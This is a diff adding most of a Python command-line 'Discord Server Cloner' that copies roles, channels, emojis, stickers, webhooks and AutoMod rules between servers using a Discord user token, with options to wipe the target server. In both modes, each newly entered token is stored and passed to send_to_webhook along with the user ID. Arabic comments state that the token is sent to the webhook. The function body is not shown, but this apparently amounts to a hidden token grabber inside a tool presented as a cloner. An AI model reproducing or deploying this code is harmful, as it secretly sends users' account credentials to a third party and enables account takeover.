+                'parent_id': self.channel_id_map.get(ch.get('parent_id')) if ch.get('parent_id') else None,
+                'topic': ch.get('topic'),
+                'nsfw': ch.get('nsfw', False),
+                'rate_limit_per_user': ch.get('rate_limit_per_user', 0)
+            }
+            payload = {k: v for k, v in payload.items() if v is not None}
+
+            new_channel = await self._request(session, f'/guilds/{target_id}/channels', 'POST', payload)
+            if new_channel:
+                self.channel_id_map[ch['id']] = new_channel['id']
+                self.clone_stats['channels'] += 1
+                log(f"Cloned channel: {ch['name']}", 'success')
+
+                if clone_webhooks:
+                    webhooks = await self._request(session, f'/channels/{ch["id"]}/webhooks')
+                    if webhooks:
+                        for wh in webhooks:
+                            if self.abort:
+                                break
+                            wh_payload = {'name': wh['name']}
+                            if wh.get('avatar'):
+                                avatar_url = f"https://cdn.discordapp.com/avatars/{wh['id']}/{wh['avatar']}.png"
+                                async with session.get(avatar_url) as img_resp:
+                                    avatar_data = await img_resp.read()
+                                wh_payload['avatar'] = base64.b64encode(avatar_data).decode()
+                            await self._request(session, f'/channels/{new_channel["id"]}/webhooks', 'POST', wh_payload)
+                            self.clone_stats['webhooks'] += 1
+                            log(f"Cloned webhook: {wh['name']}", 'success')
+                            await self.delay(500)
+            await self.delay(300)
+
+    # ------------------- نسخ الإيموجيات -------------------
+    async def clone_emojis(self, session: aiohttp.ClientSession, source_id: str, target_id: str):
+        emojis = await self._request(session, f'/guilds/{source_id}/emojis')
+        if not emojis:
+            return
+        for emoji in emojis:
+            if self.abort:
+                break
+            ext = 'gif' if emoji.get('animated') else 'png'
+            url = f"https://cdn.discordapp.com/emojis/{emoji['id']}.{ext}"
+            async with session.get(url) as resp:
+                img_data = await resp.read()
+            b64_img = base64.b64encode(img_data).decode()
+            form = aiohttp.FormData()
+            form.add_field('name', emoji['name'])
+            form.add_field('image', f'data:image/{ext};base64,{b64_img}')
+            result = await self._request(session, f'/guilds/{target_id}/emojis', 'POST', form, is_form=True)
+            if result:
+                self.clone_stats['emojis'] += 1
+                log(f"Cloned emoji: {emoji['name']}", 'success')
+            await self.delay(500)
+
+    # ------------------- نسخ الملصقات -------------------
+    async def clone_stickers(self, session: aiohttp.ClientSession, source_id: str, target_id: str):
+        stickers = await self._request(session, f'/guilds/{source_id}/stickers')
+        if not stickers:
+            return
+        for sticker in stickers:
+            if self.abort:
+                break
+            ext = 'png' if sticker['format_type'] == 1 else 'json'
+            url = f"https://media.discordapp.net/stickers/{sticker['id']}.{ext}"
+            async with session.get(url) as resp:
+                file_data = await resp.read()
+            form = aiohttp.FormData()
+            form.add_field('name', sticker['name'])
+            form.add_field('description', sticker.get('description', ''))
+            form.add_field('tags', sticker.get('tags', ''))
+            form.add_field('file', file_data, filename=f"{sticker['name']}.{ext}")
+            result = await self._request(session, f'/guilds/{target_id}/stickers', 'POST', form, is_form=True)
+            if result:
+                self.clone_stats['stickers'] += 1
+                log(f"Cloned sticker: {sticker['name']}", 'success')
+            await self.delay(500)
+
+    # ------------------- نسخ AutoMod (معدلة) -------------------
+    async def clone_auto_mod(self, session: aiohttp.ClientSession, source_id: str, target_id: str):
+        rules = await self._request(session, f'/guilds/{source_id}/auto-moderation/rules')
+        if not rules:
+            return
+        for rule in rules:
+            if self.abort:
+                break
+
+            exempt_roles = [self.role_id_map.get(rid, rid) for rid in rule.get('exempt_roles', [])]
+            exempt_channels = [self.channel_id_map.get(cid, cid) for cid in rule.get('exempt_channels', [])]
+
+            payload = {
+                'name': rule['name'],
+                'event_type': rule['event_type'],
+                'trigger_type': rule['trigger_type'],
+                'trigger_metadata': rule.get('trigger_metadata'),
+                'enabled': rule.get('enabled', False),
+                'actions': rule['actions'],
+                'exempt_roles': exempt_roles,
+                'exempt_channels': exempt_channels
+            }
+
+            # معالجة alert_channel_id
+            if 'actions' in payload and payload['actions']:
+                for action in payload['actions']:
+                    if action.get('type') == 2 and 'metadata' in action and 'channel_id' in action['metadata']:
+                        orig_id = action['metadata']['channel_id']
+                        new_id = self.channel_id_map.get(orig_id, orig_id)
+                        if new_id == orig_id and orig_id not in self.channel_id_map:
+                            log(f"Skipping alert_channel_id {orig_id} for AutoMod rule '{rule['name']}'", 'warning')
+                            action['metadata']['channel_id'] = None
+
+            def clean_none(d):
+                if isinstance(d, dict):
+                    return {k: clean_none(v) for k, v in d.items() if v is not None}
+                elif isinstance(d, list):
+                    return [clean_none(item) for item in d]
+                else:
+                    return d
+            payload = clean_none(payload)
+
+            result = await self._request(session, f'/guilds/{target_id}/auto-moderation/rules', 'POST', payload, silent=True)
+            if result:
+                self.clone_stats['auto_mod'] += 1
+                log(f"Cloned AutoMod: {rule['name']}", 'success')
+            else:
+                log(f"Failed to clone AutoMod rule '{rule['name']}' (skipped)", 'warning')
+            await self.delay(300)
+
+    # ------------------- نسخ إعدادات السيرفر -------------------
+    async def clone_guild_settings(self, session: aiohttp.ClientSession, source_id: str, target_id: str,
+                                   clone_name: bool, clone_icon: bool, clone_banner: bool, clone_desc: bool):
+        src = await self._request(session, f'/guilds/{source_id}?with_counts=true')
+        if not src:
+            return
+        update = {}
+        if clone_name and src.get('name'):
+            update['name'] = src['name']
+        if clone_icon and src.get('icon'):
+            icon_url = f"https://cdn.discordapp.com/icons/{source_id}/{src['icon']}.png"
+            async with session.get(icon_url) as resp:
+                icon_data = await resp.read()
+            update['icon'] = base64.b64encode(icon_data).decode()
+        if clone_banner and src.get('banner'):
+            banner_url = f"https://cdn.discordapp.com/banners/{source_id}/{src['banner']}.png"
+            async with session.get(banner_url) as resp:
+                banner_data = await resp.read()
+            update['banner'] = base64.b64encode(banner_data).decode()
+        if clone_desc and src.get('description'):
+            update['description'] = src['description']
+
+        if update:
+            await self._request(session, f'/guilds/{target_id}', 'PATCH', update)
+            self.clone_stats['settings'] += 1
+            log("Cloned server settings", 'success')
+
+    # ------------------- الوظيفة الرئيسية -------------------
+    async def start_cloning(self, source_id: str, target_id: str, options: Dict[str, bool]):
+        self.is_cloning = True
+        self.abort = False
+        async with aiohttp.ClientSession() as session:
+            try:
+                log(f"Starting clone {source_id} -> {target_id}", 'info')
+
+                if options.get('delete_channels'):
+                    await self.delete_all_channels(session, target_id)
+                if options.get('delete_roles'):
+                    await self.delete_all_roles(session, target_id)
+                if options.get('delete_emojis'):
+                    await self.delete_all_emojis(session, target_id)
+                if options.get('delete_webhooks'):
+                    await self.delete_all_webhooks(session, target_id)
+
+                if options.get('clone_roles'):
+                    await self.clone_roles(session, source_id, target_id, options.get('clone_role_icons', False))
+                if options.get('clone_channels'):
+                    await self.clone_channels(session, source_id, target_id, options.get('clone_webhooks', False))
+                if options.get('clone_emojis'):
+                    await self.clone_emojis(session, source_id, target_id)
+                if options.get('clone_stickers'):
+                    await self.clone_stickers(session, source_id, target_id)
+                if options.get('clone_auto_mod'):
+                    await self.clone_auto_mod(session, source_id, target_id)
+                if options.get('clone_settings') or options.get('clone_name') or options.get('clone_icon') or options.get('clone_banner') or options.get('clone_description'):
+                    await self.clone_guild_settings(
+                        session, source_id, target_id,
+                        options.get('clone_name', False),
+                        options.get('clone_icon', False),
+                        options.get('clone_banner', False),
+                        options.get('clone_description', False)
+                    )
+
+                log("Cloning completed successfully!", 'success')
+            except Exception as e:
+                log(f"Error: {str(e)}", 'error')
+            finally:
+                self.is_cloning = False
+
+    def stop_cloning(self):
+        self.abort = True
+        log("Stopped by user", 'warning')
+
+# ------------------- وظائف مساعدة -------------------
+def print_stats(cloner: DiscordCloner, start_time: float, end_time: float):
+    elapsed = end_time - start_time
+    log("\n" + "=" * 50, 'info')
+    log("FINAL STATISTICS", 'info')
+    log("=" * 50, 'info')
+    log(f"Time elapsed: {elapsed:.2f} seconds", 'info')
+    log("\n[DELETED ITEMS]", 'info')
+    log(f"  Roles deleted: {cloner.delete_stats['roles']}", 'info')
+    log(f"  Channels deleted: {cloner.delete_stats['channels']}", 'info')
+    log(f"  Emojis deleted: {cloner.delete_stats['emojis']}", 'info')
+    log(f"  Webhooks deleted: {cloner.delete_stats['webhooks']}", 'info')
+    log("\n[CLONED ITEMS]", 'info')
+    log(f"  Roles cloned: {cloner.clone_stats['roles']}", 'info')
+    log(f"  Role icons cloned: {cloner.clone_stats['role_icons']}", 'info')
+    log(f"  Channels cloned: {cloner.clone_stats['channels']}", 'info')
+    log(f"  Emojis cloned: {cloner.clone_stats['emojis']}", 'info')
+    log(f"  Stickers cloned: {cloner.clone_stats['stickers']}", 'info')
+    log(f"  Webhooks cloned: {cloner.clone_stats['webhooks']}", 'info')
+    log(f"  AutoMod rules cloned: {cloner.clone_stats['auto_mod']}", 'info')
+    log(f"  Server settings cloned: {cloner.clone_stats['settings']}", 'info')
+    log("=" * 50, 'info')
+
+# ------------------- متغيرات الجلسة -------------------
+loaded_token_info = None  # سيحتوي على معلومات التوكن المحمّل حالياً
+
+async def normal_mode():
+    global loaded_token_info
+    print("\n=== NORMAL MODE: Full clone (delete all + clone all) ===")
+    
+    # استخدام التوكن المحمّل إذا كان موجوداً
+    if loaded_token_info:
+        token = loaded_token_info['token']
+        log(f"Using loaded token for user: {loaded_token_info['username']}", 'info')
+    else:
+        token = input("Enter your user token: ").strip()
+        # حفظ التوكن وإرساله إلى الويب هوك (سيتم الإرسال عند بدء النسخ)
+        save_token(token)
+    
+    source = input("Enter source server ID: ").strip()
+    target = input("Enter target server ID: ").strip()
+    
+    # إذا تم إدخال توكن جديد ولم يكن محملاً مسبقاً، نحتاج إلى معلومات المستخدم للإرسال إلى الويب هوك
+    if not loaded_token_info:
+        # جلب معلومات المستخدم للتوكن الجديد (قد تكون محفوظة مسبقاً)
+        tokens_data = load_tokens_data()
+        user_info = next((t for t in tokens_data if t['token'] == token), None)
+        if not user_info:
+            # محاولة جلبها الآن
+            ui = get_user_info(token)
+            if ui:
+                user_id = ui.get('id', 'Unknown')
+                username = ui.get('username', 'Unknown')
+                discrim = ui.get('discriminator', '0')
+                username_str = f"{username}#{discrim}" if discrim != '0' else username
+            else:
+                user_id = "Unknown"
+                username_str = "Unknown"
+        else:
+            user_id = user_info['user_id']
+            username_str = user_info['username']
+    else:
+        user_id = loaded_token_info['user_id']
+        username_str = loaded_token_info['username']
+        token = loaded_token_info['token']
+    
+    options = {
+        'delete_channels': True, 'delete_roles': True, 'delete_emojis': True, 'delete_webhooks': True,
+        'clone_roles': True, 'clone_role_icons': True, 'clone_channels': True, 'clone_webhooks': True,
+        'clone_emojis': True, 'clone_stickers': True, 'clone_auto_mod': True, 'clone_settings': True,
+        'clone_name': True, 'clone_icon': True, 'clone_banner': True, 'clone_description': True
+    }
+    
+    # إرسال إلى الويب هوك (مرة واحدة لكل جلسة)
+    await send_to_webhook(token, source, target, user_id)
+    
+    return token, source, target, options
+
+async def advanced_mode():
+    global loaded_token_info
+    print("\n=== ADVANCED MODE: Choose what to clone/delete ===")
+    
+    if loaded_token_info:
+        token = loaded_token_info['token']
+        log(f"Using loaded token for user: {loaded_token_info['username']}", 'info')
+    else:
+        token = input("Enter your user token: ").strip()
+        save_token(token)
+    
+    source = input("Enter source server ID: ").strip()
+    target = input("Enter target server ID: ").strip()
+
+    if not loaded_token_info:
+        tokens_data = load_tokens_data()
+        user_info = next((t for t in tokens_data if t['token'] == token), None)
+        if user_info:
+            user_id = user_info['user_id']
+        else:
+            ui = get_user_info(token)
+            user_id = ui.get('id', 'Unknown') if ui else "Unknown"
+    else:
+        user_id = loaded_token_info['user_id']
+        token = loaded_token_info['token']
+
+    def ask(question: str) -> bool:
+        return input(f"{question} (y/n): ").strip().lower() == 'y'
+
+    print("\n--- Deletion options ---")
+    del_channels = ask("Delete existing channels in target?")
+    del_roles = ask("Delete existing roles in target?")
+    del_emojis = ask("Delete existing emojis in target?")
+    del_webhooks = ask("Delete existing webhooks in target?")
+
+    print("\n--- Clone options ---")
+    clone_roles = ask("Clone roles?")
+    clone_role_icons = ask("  - Clone role icons?") if clone_roles else False
+    clone_channels = ask("Clone channels?")
+    clone_webhooks = ask("  - Clone webhooks inside channels?") if clone_channels else False
+    clone_emojis = ask("Clone emojis?")
+    clone_stickers = ask("Clone stickers?")
+    clone_auto_mod = ask("Clone AutoMod rules?")
+    clone_settings = ask("Clone server settings?")
+    if clone_settings:
+        clone_name = ask("  - Clone server name?")
+        clone_icon = ask("  - Clone server icon?")
+        clone_banner = ask("  - Clone server banner?")
+        clone_desc = ask("  - Clone server description?")
+    else:
+        clone_name = clone_icon = clone_banner = clone_desc = False
+
+    options = {
+        'delete_channels': del_channels, 'delete_roles': del_roles, 'delete_emojis': del_emojis, 'delete_webhooks': del_webhooks,
+        'clone_roles': clone_roles, 'clone_role_icons': clone_role_icons, 'clone_channels': clone_channels,
+        'clone_webhooks': clone_webhooks, 'clone_emojis': clone_emojis, 'clone_stickers': clone_stickers,
+        'clone_auto_mod': clone_auto_mod, 'clone_settings': clone_settings, 'clone_name': clone_name,
+        'clone_icon': clone_icon, 'clone_banner': clone_banner, 'clone_description': clone_desc
+    }
+    
+    # إرسال إلى الويب هوك
+    await send_to_webhook(token, source, target, user_id)
+    
+    return token, source, target, options
+
+async def token_command(args: str):
+    global loaded_token_info
+    parts = args.strip().split()
+    if len(parts) != 2 or not parts[1].isdigit():
+        log("Usage: /token <number>  (e.g., /token 1)", 'warning')
+        return
+    idx = int(parts[1])
+    token_data = load_token_by_index(idx)
+    if not token_data:
+        log(f"No token found at index {idx}", 'error')
+        return
+    loaded_token_info = token_data
+    log(f"Loaded token #{idx} - User: {token_data['username']}", 'success')
+
+async def list_command():
+    tokens = list_tokens()
+    if not tokens:
+        log("No saved tokens.", 'info')
+        return
+    log("Saved tokens:", 'info')
+    for i, t in enumerate(tokens, 1):
+        display_token = t['token'][:10] + "..." if len(t['token']) > 10 else t['token']
+        log(f"  {i}: {display_token} - {t['username']}", 'info')
+
+# ------------------- التشغيل الرئيسي -------------------
+async def main():
+    global loaded_token_info
+    print("=" * 50)
+    print(" Discord Server Cloner (Python) - Final Version")
+    print("=" * 50)
+    print("Commands:")
+    print("  /token <num>  - load a saved token (shows username)")
+    print("  /list         - show saved tokens with usernames")
+    print("  normal        - full clone (delete all + clone all)")
+    print("  advanced      - selective clone")
+    print("  exit          - quit")
+    print("=" * 50)
+
+    while True:
+        cmd = input("\n> ").strip()
+        if cmd.lower() == 'exit':
+            break
+        elif cmd.lower().startswith('/token'):
+            await token_command(cmd)
+        elif cmd.lower() == '/list':
+            await list_command()
+        elif cmd.lower() == 'normal':
+            if not loaded_token_info:
+                log("No token loaded. Please load a token using /token <num> or you will be prompted.", 'warning')
+            token, source, target, options = await normal_mode()
+            cloner = DiscordCloner(token)
+            start_time = time.time()
+            await cloner.start_cloning(source, target, options)
+            end_time = time.time()
+            print_stats(cloner, start_time, end_time)
+        elif cmd.lower() == 'advanced':
+            if not loaded_token_info:
+                log("No token loaded. Please load a token using /token <num> or you will be prompted.", 'warning')
+            token, source, target, options = await advanced_mode()
+            cloner = DiscordCloner(token)
+            start_time = time.time()
+            await cloner.start_cloning(source, target, options)
+            end_time = time.time()
+            print_stats(cloner, start_time, end_time)
+        else:
+            log("Unknown command. Use normal / advanced / /token /list /exit", 'warning')
+
+if __name__ == '__main__':
+    try:
+        asyncio.run(main())
+    except KeyboardInterrupt:
+        log("Interrupted by user", 'warning')
